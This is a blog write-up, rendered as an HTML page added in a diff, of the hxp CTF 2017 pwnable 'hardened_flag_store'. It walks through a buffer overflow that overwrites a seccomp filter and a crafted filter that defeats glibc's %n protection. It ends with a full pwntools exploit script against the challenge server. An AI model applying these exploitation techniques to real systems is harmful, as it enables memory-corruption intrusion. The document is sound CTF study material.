@@ -1,0 +1,741 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.13.0 by Michael Rose
+  Copyright 2013-2018 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE.txt
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>hxp CTF 2017 – hardened_flag_store - Hacking Tube 2.0</title>
+<meta name="description" content="Category: Pwnable">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacking Tube 2.0">
+<meta property="og:title" content="hxp CTF 2017 – hardened_flag_store">
+<meta property="og:url" content="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/">
+
+
+  <meta property="og:description" content="Category: Pwnable">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2017-11-21T03:18:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacking Tube 2.0 Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if lte IE 9]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    <div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        <a class="site-title" href="/">Hacking Tube 2.0</a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/about" >About</a>
+            </li><li class="masthead__menu-item">
+              <a href="/archives/" >Archive</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle Menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="http://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/other/gravatar.png" alt="Bruce Chen" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bruce Chen</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Vulnerability researcher / CTFer
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="http://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Taiwan</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/bruce30262"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+          
+        
+          
+            <li><a href="https://github.com/bruce30262"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="http://schema.org/CreativeWork">
+    <meta itemprop="headline" content="hxp CTF 2017 – hardened_flag_store">
+    <meta itemprop="description" content="Category: Pwnable">
+    <meta itemprop="datePublished" content="November 21, 2017">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">hxp CTF 2017 – hardened_flag_store
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p><strong>Category:</strong> Pwnable</p>
+
+<p>64 bit ELF with PIE, NX, FULL RELRO enabled</p>
+
+<!-- more -->
+
+<p>The program will read a secret string from “secret.txt” and store the string address on stack. Then it will use seccomp to create a whitelist of syscalls. We can analyze the filter by using <a href="https://github.com/david942j/seccomp-tools">seccomp-tools</a>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
+ 0002: 0x06 0x00 0x00 0x00000000  return KILL
+ 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0004: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0006
+ 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
+ 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
+ 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0010: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0014
+ 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0014: 0x06 0x00 0x00 0x00000000  return KILL
+</code></pre></div></div>
+
+<p>So now the program are only allowed to use the following system calls: <code class="highlighter-rouge">exit</code>, <code class="highlighter-rouge">read</code>, <code class="highlighter-rouge">write</code>, <code class="highlighter-rouge">open</code> and <code class="highlighter-rouge">close</code>.</p>
+
+<p>After that the program will do the following ( pseudo code ) :</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">cnt</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">has_seccomp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span><span class="n">cnt</span><span class="o">--</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="mi">96</span><span class="p">);</span> <span class="c1">// read user input
+</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">has_seccomp</span><span class="p">)</span> <span class="n">init_seccomp</span><span class="p">();</span> <span class="c1">// set up seccomp rule
+</span>    <span class="n">len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span> <span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">)</span> <span class="c1">// check if input == secret_string
+</span>    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="n">i</span> <span class="p">)</span>
+            <span class="k">goto</span> <span class="n">LABEL_19</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="n">secret_string</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Wrong secret :/"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">==</span> <span class="n">i</span> <span class="p">)</span>
+<span class="n">LABEL_19</span><span class="o">:</span>
+        <span class="n">openflag</span><span class="p">();</span> <span class="c1">// input == secret_string, open flag.txt and print it to stdout
+</span>    <span class="n">_fprintf_chk</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span> <span class="c1">// &lt;-- format string vuln
+</span>    <span class="n">has_seccomp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can spot a format string vulnerability @ line 19. Although the secret string’s address is stored on stack, however the output of <code class="highlighter-rouge">_fprintf_chk</code> is set to stderr, so we can’t use <code class="highlighter-rouge">%s</code> to leak the secret string.</p>
+
+<p>But there’s still one way to bypass the check. At line 16:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">secret_string</span><span class="p">)</span> <span class="o">==</span> <span class="n">i</span> <span class="p">)</span>
+<span class="n">LABEL_19</span><span class="o">:</span>
+        <span class="n">openflag</span><span class="p">();</span> <span class="c1">// input == secret_string, open flag.txt and print it to stdout
+</span></code></pre></div></div>
+
+<p>If we can overwrite the first character of the secret string to a null byte, and input a random string, both <code class="highlighter-rouge">strlen(secret_string)</code> and <code class="highlighter-rouge">i</code> will be <code class="highlighter-rouge">0</code>, thus bypass the check and will print out the flag.</p>
+
+<p>However this will require us to use the <code class="highlighter-rouge">%n</code> format string payload – which in this case will be blocked by the seccomp filter:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./flag_store
+%n
+Wrong secret :/
+[1]    5295 invalid system call  ./flag_store
+</code></pre></div></div>
+
+<p>Fortunately my teammate found that there’s a buffer overflow vulnerability while reading the user input. We can input at most 96 chars to the buffer, while its size is only 32. Moreover, this make us able to overwrite the seccomp rule ! So then we overwrite the seccomp rule with a bunch of null bytes and send the <code class="highlighter-rouge">%n</code> character:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Sending null bytes
+[*] Sending fmt payload
+[*] Switching to interactive mode
+Wrong secret :/
+Wrong secret :/
+*** %n in writable segment detected ***
+[*] Got EOF while reading in interactive
+</code></pre></div></div>
+
+<p>OK, so we successfully overwrite the seccomp rule, but still the <code class="highlighter-rouge">%n</code> payload was blocked by <code class="highlighter-rouge">_fprintf_chk</code>, which is a more secure version of <code class="highlighter-rouge">fprintf</code>. At this point I started to think that maybe we need to write some seccomp rules to bypass the format string check.</p>
+
+<p>And so I started reading the <a href="https://code.woboq.org/userspace/glibc/stdio-common/vfprintf.c.html#__readonly_area">glibc source code</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">................</span>
+    <span class="p">{</span>                                                                      \
+      <span class="k">extern</span> <span class="kt">int</span> <span class="n">__readonly_area</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="kt">size_t</span><span class="p">)</span>                      \
+        <span class="n">attribute_hidden</span><span class="p">;</span>                                              \
+      <span class="n">readonly_format</span>                                                      \
+        <span class="o">=</span> <span class="n">__readonly_area</span> <span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="p">((</span><span class="n">STR_LEN</span> <span class="p">(</span><span class="n">format</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>              \
+                                    <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">CHAR_T</span><span class="p">)));</span>              \
+    <span class="p">}</span>                                                                      \
+  <span class="k">if</span> <span class="p">(</span><span class="n">readonly_format</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>                                              \
+    <span class="n">__libc_fatal</span> <span class="p">(</span><span class="s">"*** %n in writable segment detected ***</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>              \
+<span class="p">}</span>  
+</code></pre></div></div>
+
+<p>Hmmmm, looks like we’ll have to make <code class="highlighter-rouge">readonly_format &gt;= 0</code> so it won’t call <code class="highlighter-rouge">__libc_fatal ("*** %n in writable segment detected ***\n");</code>. Let’s trace into the <a href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/readonly-area.c.html#__readonly_area">__readonly_area() function</a>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__readonly_area</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr_end</span> <span class="o">=</span> <span class="n">ptr</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span> <span class="p">(</span><span class="s">"/proc/self/maps"</span><span class="p">,</span> <span class="s">"rce"</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* It is the system administrator's choice to not have /proc
+         available to this process (e.g., because it runs in a chroot
+         environment.  Don't fail in this case.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">errno</span> <span class="o">==</span> <span class="n">ENOENT</span>
+          <span class="cm">/* The kernel has a bug in that a process is denied access
+             to the /proc filesystem if it is set[ug]id.  There has
+             been no willingness to change this in the kernel so
+             far.  */</span>
+          <span class="o">||</span> <span class="n">errno</span> <span class="o">==</span> <span class="n">EACCES</span><span class="p">)</span>
+        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="p">...................</span>
+</code></pre></div></div>
+
+<p>Ah ha ! We can see that <code class="highlighter-rouge">__readonly_area</code> will call <code class="highlighter-rouge">fopen()</code>, and see if its <code class="highlighter-rouge">errno</code> is equals to <code class="highlighter-rouge">EACCES</code> or <code class="highlighter-rouge">ENOENT</code>. <strong>If so, it will return 1</strong> !! Since we can write our own seccomp rule, we can totally make this happen !</p>
+
+<p>So first we create our own seccomp rule:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># # check if arch is X86_64
+A = arch
+A == 0xc000003e ? next : ok
+A = sys_number
+A == open ? next : ok
+A = args[2]
+A == 0x1b6 ? magic : ok # check the 3rd arg of open()
+magic:
+return ERRNO(13) # ERRNO(EACCES)
+ok:
+return ALLOW
+</code></pre></div></div>
+
+<p>Notice that in order to make <code class="highlighter-rouge">open("flag.txt", 0x80000)</code> ( in the <code class="highlighter-rouge">openflag()</code> function ) works normally, we’ll have to add the rule <code class="highlighter-rouge">A == 0x1b6 ? magic : ok</code>. This indicates that if the 3rd argument of <code class="highlighter-rouge">open()</code> equals to <code class="highlighter-rouge">0x1b6</code>, return <code class="highlighter-rouge">ERRNO(13)</code>, otherwise allow the system call. I wrote this rule because I found that when <code class="highlighter-rouge">__readonly_area()</code> calls <code class="highlighter-rouge">fopen ("/proc/self/maps", "rce");</code>, the 3rd argument of <code class="highlighter-rouge">open()</code> was exactly <code class="highlighter-rouge">0x1b6</code>.</p>
+
+<p>By using the <a href="https://github.com/david942j/seccomp-tools#asm">asm</a> feature of the seccomp-tools, we can generate the raw bytes of our seccomp rule:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat ./rule 
+# # check if arch is X86_64
+A = arch
+A == 0xc000003e ? next : ok
+A = sys_number
+A == open ? next : ok
+A = args[2]
+A == 0x1b6 ? magic : ok
+magic:
+return ERRNO(13)
+ok:
+return ALLOW
+
+$ seccomp-tools asm ./rule
+" \x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05&gt;\x00\x00\xC0 \x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00 \x00\x00\x00 \x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F"
+
+</code></pre></div></div>
+
+<p>At last we apply our seccomp rule, exploit the format string vulnerability to bypass the check and get the flag:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c"># from brucepwn import *</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"35.198.105.104"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">10000</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./flag_store"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">LIBC_PATH</span> <span class="k">else</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">libc</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="s">"Failed to load libc"</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = elf.process() # elf.process(argv=[argv1, argv2,...])</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mh">0x20</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">" </span><span class="se">\x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x05</span><span class="s">&gt;</span><span class="se">\x00\x00\xC0</span><span class="s"> </span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x02\x00\x00\x00</span><span class="s"> </span><span class="se">\x00\x00\x00</span><span class="s"> </span><span class="se">\x00\x00\x00\x15\x00\x00\x01\xB6\x01\x00\x00\x06\x00\x00\x00\r\x00\x05\x00\x06\x00\x00\x00\x00\x00\xFF\x7F</span><span class="s">"</span>
+    <span class="k">print</span> <span class="s">"len:"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">96</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"</span><span class="si">%128</span><span class="s">c</span><span class="si">%128</span><span class="s">c</span><span class="si">%</span><span class="s">hhn"</span><span class="p">)</span>
+    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+</code></pre></div></div>
+
+<p>flag: <code class="highlighter-rouge">hxp{d0n7_w0rry_glibc_1_571ll_l0v3_y0u}</code></p>
+
+<p>First blood on this one ! WOOHOO ! 😎</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#bof" class="page__taxonomy-item" rel="tag">BOF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hxp" class="page__taxonomy-item" rel="tag">hxp</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#seccomp" class="page__taxonomy-item" rel="tag">seccomp</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2017-11-21T03:18:00+08:00">November 21, 2017</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=hxp+CTF+2017+--+hardened_flag_store%20http%3A%2F%2F0.0.0.0%3A4000%2Fhxp-CTF-2017-hardened-flag-store%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fhxp-CTF-2017-hardened-flag-store%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fhxp-CTF-2017-hardened-flag-store%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" class="pagination--pager" title="MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+">Previous</a>
+    
+    
+      <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" class="pagination--pager" title="Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-anotherarena/" rel="permalink">MeePwn CTF 2017 – anotherarena
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/hxp-CTF-2017-hardened-flag-store/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/hxp-CTF-2017-hardened-flag-store"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
